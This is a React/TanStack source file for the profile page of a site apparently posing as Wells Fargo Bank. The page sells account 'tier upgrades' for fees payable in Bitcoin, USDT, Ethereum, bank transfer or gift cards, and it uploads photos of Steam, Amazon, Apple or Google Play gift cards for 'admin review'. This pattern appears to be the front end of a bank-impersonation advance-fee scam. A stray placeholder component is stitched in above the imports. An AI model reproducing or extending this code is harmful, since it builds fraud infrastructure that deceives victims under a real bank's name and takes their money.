
function RouteComponent() {
  return <div>Hello "/_authenticated/profile"!</div>
}
import { createFileRoute } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { useState } from "react";

import {
  ArrowLeft,
  ArrowRight,
  Bitcoin,
  Building2,
  Check,
  CreditCard,
  Gift,
  ImagePlus,
  ShieldCheck,
  Sparkles,
  X,
} from "lucide-react";

import { toast } from "sonner";

import { AppShell } from "@/components/AppShell";
import { StatusBadge } from "@/components/bank-bits";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

import { useProfile } from "@/hooks/useBank";
import { money } from "@/lib/format";
import { TIER_UPGRADE_FEES } from "@/lib/bank-helpers";
import { supabase } from "@/integrations/supabase/client";
import { createTierUpgradeRequest, getMyTierRequests } from "@/lib/bank.functions";

export const Route = createFileRoute("/_authenticated/profile")({
  head: () => ({
    meta: [
      { title: "Profile — wellsfargo Bank" },
      { name: "description", content: "View your profile, tier, and upgrade options." },
    ],
  }),
  component: ProfilePage,
});

type Step = 1 | 2 | 3 | 4;
type TierTarget = "tier2" | "tier3";
type PaymentMethod = "btc" | "usdt" | "ethereum" | "bank_transfer" | "gift_card";

const TIER_LABELS: Record<string, string> = {
  tier1: "Tier 1",
  tier2: "Tier 2",
  tier3: "Tier 3",
};

const UPGRADE_TARGETS: { key: TierTarget; title: string }[] = [
  { key: "tier2", title: "Tier 2" },
  { key: "tier3", title: "Tier 3" },
];

const PAYMENT_METHODS = [
  { key: "btc" as const, title: "Bitcoin", description: "Pay with Bitcoin", icon: Bitcoin },
  { key: "usdt" as const, title: "USDT", description: "Pay with USDT", icon: CreditCard },
  { key: "ethereum" as const, title: "Ethereum", description: "Pay with Ethereum", icon: CreditCard },
  { key: "bank_transfer" as const, title: "Bank Transfer", description: "Pay via bank transfer", icon: Building2 },
  { key: "gift_card" as const, title: "Gift Card", description: "Submit gift-card images for admin review", icon: Gift },
];

type GiftCardImage = { file: File; preview: string };

function ProfilePage() {
  const queryClient = useQueryClient();
  const { data: profile } = useProfile();

  const submitUpgrade = useServerFn(createTierUpgradeRequest);
  const loadRequests = useServerFn(getMyTierRequests);

  const requestsQuery = useQuery({
    queryKey: ["my-tier-requests"],
    queryFn: () => loadRequests(),
    retry: false,
  });

  const currency = profile?.currency ?? "USD";
  const currentTier = profile?.tier ?? "tier1";

  const [open, setOpen] = useState(false);
  const [step, setStep] = useState<Step>(1);
  const [busy, setBusy] = useState(false);
  const [uploadingImages, setUploadingImages] = useState(false);

  const [target, setTarget] = useState<TierTarget>("tier2");
  const [payment, setPayment] = useState<PaymentMethod>("btc");
  const [giftCardType, setGiftCardType] = useState("steam");
  const [giftCardImages, setGiftCardImages] = useState<GiftCardImage[]>([]);

  const availableTargets = UPGRADE_TARGETS.filter((t) => t.key !== currentTier);
  const selectedFee = TIER_UPGRADE_FEES[target];

  function resetFlow() {
    setStep(1);
    setTarget(availableTargets[0]?.key ?? "tier2");
    setPayment("btc");
    setGiftCardType("steam");
    setGiftCardImages([]);
    setBusy(false);
    setUploadingImages(false);
  }

  function closeDialog() {
    setOpen(false);
    resetFlow();
  }

  function nextStep() {
    if (step === 1) return setStep(2);
    if (step === 2) return setStep(3);
  }

  function previousStep() {
    if (step === 1 || step === 4) return;
    setStep((step - 1) as Step);
  }

  function handleGiftCardUpload(event: React.ChangeEvent<HTMLInputElement>) {
    const files = Array.from(event.target.files ?? []);
    event.target.value = "";
    if (!files.length) return;

    if (giftCardImages.length + files.length > 20) {
      toast.error("You can upload up to 20 images");
      return;
    }

    for (const file of files) {
      if (!["image/jpeg", "image/png", "image/webp"].includes(file.type)) {
        toast.error(`${file.name}: use JPG, PNG, or WebP`);
        continue;
      }
      if (file.size > 5 * 1024 * 1024) {
        toast.error(`${file.name}: must be smaller than 5MB`);
        continue;
      }
      setGiftCardImages((prev) => [...prev, { file, preview: URL.createObjectURL(file) }]);
    }
  }

  function removeGiftCardImage(idx: number) {
    setGiftCardImages((prev) => prev.filter((_, i) => i !== idx));
  }

  async function uploadGiftCardImages(): Promise<string[]> {
    const urls: string[] = [];
    for (const { file } of giftCardImages) {
      const ext = file.name.split(".").pop();
      const path = `${Date.now()}-${Math.random().toString(36).slice(2)}.${ext}`;
      const { error } = await supabase.storage.from("tier-upgrade-images").upload(path, file);
      if (error) throw error;
      const { data } = supabase.storage.from("tier-upgrade-images").getPublicUrl(path);
      urls.push(data.publicUrl);
    }
    return urls;
  }

  async function submitUpgradeRequest() {
    if (payment === "gift_card" && giftCardImages.length === 0) {
      toast.error("Upload at least one gift card image");
      return;
    }

    setBusy(true);

    try {
      let giftCardImageUrls: string[] = [];

      if (payment === "gift_card") {
        setUploadingImages(true);
        giftCardImageUrls = await uploadGiftCardImages();
        setUploadingImages(false);
      }

      await submitUpgrade({
        data: {
          requestedTier: target,
          paymentMethod: payment,
          giftCardType: payment === "gift_card" ? giftCardType : undefined,
          giftCardImageUrls: payment === "gift_card" ? giftCardImageUrls : undefined,
        },
      });

      await queryClient.invalidateQueries({ queryKey: ["my-tier-requests"] });
      setStep(4);
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Unable to submit upgrade request");
    } finally {
      setBusy(false);
      setUploadingImages(false);
    }
  }

  return (
    <AppShell title="Profile">
      <div className="space-y-6">
        <section className="rounded-3xl border border-border/70 bg-card p-5 shadow-sm">
          <div className="flex flex-col items-center gap-4 text-center sm:flex-row sm:items-center sm:text-left">
            <div className="grid size-20 shrink-0 place-items-center overflow-hidden rounded-full bg-muted">
              {profile?.avatar_url ? (
                <img src={profile.avatar_url} alt="" className="size-full object-cover" />
              ) : (
                <span className="font-display text-2xl font-bold text-muted-foreground">
                  {(profile?.full_name ?? profile?.email ?? "U").charAt(0).toUpperCase()}
                </span>
              )}
            </div>

            <div className="min-w-0 flex-1">
              <h1 className="font-display text-xl font-bold">{profile?.full_name ?? "Your profile"}</h1>
              <p className="text-sm text-muted-foreground">{profile?.email}</p>
              <span className="mt-2 inline-flex items-center gap-1.5 rounded-full bg-primary/10 px-3 py-1 text-xs font-semibold text-primary">
                <ShieldCheck className="size-3.5" />
                {TIER_LABELS[currentTier] ?? currentTier}
              </span>
            </div>

            {availableTargets.length > 0 && (
              <Button onClick={() => { resetFlow(); setOpen(true); }}>
                <Sparkles className="size-4" />
                Upgrade Tier
              </Button>
            )}
          </div>
        </section>

        {(requestsQuery.data ?? []).length > 0 && (
          <section>
            <div className="mb-3">
              <h2 className="font-display text-lg font-semibold">Upgrade requests</h2>
              <p className="text-sm text-muted-foreground">Track requests awaiting review.</p>
            </div>

            <div className="grid gap-3">
              {(requestsQuery.data ?? []).map((item: any) => (
                <div key={item.id} className="rounded-2xl border border-border/70 bg-card p-4">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="font-semibold">
                        Upgrade to {TIER_LABELS[item.requested_tier] ?? item.requested_tier}
                      </p>
                      <p className="mt-1 text-xs text-muted-foreground">
                        {formatPaymentMethod(item.payment_method)} · {new Date(item.created_at).toLocaleString()}
                      </p>
                    </div>
                    <StatusBadge
                      status={
                        item.status === "approved" ? "completed" : item.status === "rejected" ? "failed" : "pending"
                      }
                    />
                  </div>
                </div>
              ))}
            </div>
          </section>
        )}
      </div>

      <Dialog
        open={open}
        onOpenChange={(value) => {
          if (!value) closeDialog();
          else setOpen(true);
        }}
      >
        <DialogContent className="max-h-[90vh] max-w-lg overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="font-display">Upgrade Tier</DialogTitle>
            <DialogDescription>{step <= 3 ? `Step ${step} of 3` : "Request submitted"}</DialogDescription>
          </DialogHeader>

          {step === 1 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Choose your tier</h3>
                <p className="text-sm text-muted-foreground">Select the tier you want to upgrade to.</p>
              </div>

              <div className="grid gap-3">
                {availableTargets.map((item) => {
                  const info = TIER_UPGRADE_FEES[item.key];
                  return (
                    <button
                      type="button"
                      key={item.key}
                      onClick={() => setTarget(item.key)}
                      className={`rounded-2xl border p-4 text-left transition ${
                        target === item.key ? "border-primary bg-primary/5" : "border-border hover:bg-muted/50"
                      }`}
                    >
                      <div className="flex items-start justify-between gap-3">
                        <div>
                          <p className="font-semibold">{item.title}</p>
                          <p className="mt-1 text-xs text-muted-foreground">{info?.perks}</p>
                        </div>
                        {target === item.key && (
                          <span className="grid size-6 place-items-center rounded-full bg-primary text-primary-foreground">
                            <Check className="size-4" />
                          </span>
                        )}
                      </div>

                      <div className="mt-4 flex justify-between text-xs">
                        <span className="text-muted-foreground">Upgrade fee</span>
                        <span className="font-semibold">{money(Number(info?.fee ?? 0), currency)}</span>
                      </div>
                    </button>
                  );
                })}
              </div>

              <Button className="w-full" onClick={nextStep}>
                Continue
                <ArrowRight className="size-4" />
              </Button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Choose payment method</h3>
                <p className="text-sm text-muted-foreground">Select how you'd like to pay the upgrade fee.</p>
              </div>

              <div className="grid gap-2">
                {PAYMENT_METHODS.map((method) => {
                  const Icon = method.icon;
                  return (
                    <button
                      type="button"
                      key={method.key}
                      onClick={() => setPayment(method.key)}
                      className={`flex items-center gap-3 rounded-xl border p-4 text-left ${
                        payment === method.key ? "border-primary bg-primary/5" : "border-border hover:bg-muted/50"
                      }`}
                    >
                      <span className="grid size-10 shrink-0 place-items-center rounded-xl bg-muted">
                        <Icon className="size-5" />
                      </span>
                      <span className="min-w-0 flex-1">
                        <span className="block font-medium">{method.title}</span>
                        <span className="block text-xs text-muted-foreground">{method.description}</span>
                      </span>
                      {payment === method.key && <Check className="size-5 text-primary" />}
                    </button>
                  );
                })}
              </div>

              {payment === "gift_card" && (
                <div className="rounded-xl border border-border bg-muted/30 p-4">
                  <p className="font-medium">Gift card details</p>
                  <p className="mt-1 text-xs text-muted-foreground">Upload images for admin review.</p>

                  <div className="mt-4 space-y-2">
                    <Label>Gift card type</Label>
                    <Select value={giftCardType} onValueChange={setGiftCardType}>
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="steam">Steam</SelectItem>
                        <SelectItem value="amazon">Amazon</SelectItem>
                        <SelectItem value="apple">Apple</SelectItem>
                        <SelectItem value="google_play">Google Play</SelectItem>
                        <SelectItem value="other">Other</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="mt-4">
                    <Label htmlFor="tier-gift-card-image" className="cursor-pointer">
                      <div className="mt-2 rounded-xl border border-dashed border-border p-6 text-center transition hover:bg-muted/50">
                        <ImagePlus className="mx-auto size-7 text-muted-foreground" />
                        <p className="mt-2 text-sm font-medium">
                          {giftCardImages.length > 0
                            ? `${giftCardImages.length} image${giftCardImages.length > 1 ? "s" : ""} selected`
                            : "Upload gift card images"}
                        </p>
                        <p className="mt-1 text-xs text-muted-foreground">JPG, PNG or WebP · Max 5MB each · Up to 20 images</p>
                      </div>
                    </Label>
                    <Input
                      id="tier-gift-card-image"
                      type="file"
                      accept="image/jpeg,image/png,image/webp"
                      multiple
                      className="hidden"
                      onChange={handleGiftCardUpload}
                    />

                    {giftCardImages.length > 0 && (
                      <div className="mt-3 grid grid-cols-4 gap-2">
                        {giftCardImages.map((img, i) => (
                          <div key={i} className="relative">
                            <img src={img.preview} alt="" className="aspect-square w-full rounded-lg object-cover" />
                            <button
                              type="button"
                              onClick={() => removeGiftCardImage(i)}
                              className="absolute -right-1.5 -top-1.5 grid size-5 place-items-center rounded-full bg-destructive text-white"
                            >
                              <X className="size-3" />
                            </button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="flex gap-2">
                <Button variant="secondary" className="flex-1" onClick={previousStep}>
                  <ArrowLeft className="size-4" />
                  Back
                </Button>
                <Button className="flex-1" onClick={nextStep}>
                  Review
                  <ArrowRight className="size-4" />
                </Button>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-4">
              <div>
                <h3 className="font-semibold">Review request</h3>
                <p className="text-sm text-muted-foreground">Check everything before submitting.</p>
              </div>

              <div className="divide-y rounded-2xl border">
                <ReviewRow label="Upgrade to" value={TIER_LABELS[target] ?? target} />
                <ReviewRow label="Payment" value={formatPaymentMethod(payment)} />
                {payment === "gift_card" && <ReviewRow label="Gift card" value={giftCardType} capitalize />}
                <ReviewRow label="Upgrade fee" value={money(Number(selectedFee?.fee ?? 0), currency)} />
              </div>

              {payment === "gift_card" && giftCardImages.length > 0 && (
                <div className="grid grid-cols-4 gap-2">
                  {giftCardImages.map((img, i) => (
                    <div key={i} className="overflow-hidden rounded-xl border">
                      <img src={img.preview} alt="" className="aspect-square w-full object-cover" />
                    </div>
                  ))}
                </div>
              )}

              <div className="rounded-xl bg-muted p-3 text-xs text-muted-foreground">
                Your request will be submitted for admin review.
              </div>

              <div className="flex gap-2">
                <Button variant="secondary" className="flex-1" onClick={previousStep} disabled={busy}>
                  <ArrowLeft className="size-4" />
                  Back
                </Button>
                <Button className="flex-1" onClick={submitUpgradeRequest} disabled={busy}>
                  {uploadingImages ? "Uploading images..." : busy ? "Submitting..." : "Submit request"}
                </Button>
              </div>
            </div>
          )}

          {step === 4 && (
            <div className="space-y-5 text-center">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-success/12 text-success">
                <Check className="size-8" />
              </div>
              <div>
                <h2 className="font-display text-xl font-bold">Request submitted</h2>
                <p className="mt-1 text-sm text-muted-foreground">
                  Your upgrade to {TIER_LABELS[target] ?? target} has been sent for admin review.
                </p>
              </div>
              <Button variant="secondary" className="w-full" onClick={closeDialog}>
                Done
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </AppShell> 
  );
}

function ReviewRow({ label, value, capitalize = false }: { label: string; value: string; capitalize?: boolean }) {
  return (
    <div className="flex items-center justify-between gap-4 p-4">
      <span className="text-sm text-muted-foreground">{label}</span>
      <span className={`text-right text-sm font-semibold ${capitalize ? "capitalize" : ""}`}>{value}</span>
    </div>
  );
}

function formatPaymentMethod(method: string) {
  switch (method) {
    case "btc": return "Bitcoin";
    case "usdt": return "USDT";
    case "ethereum": return "Ethereum";
    case "bank_transfer": return "Bank Transfer";
    case "gift_card": return "Gift Card";
    default: return method;
  }
}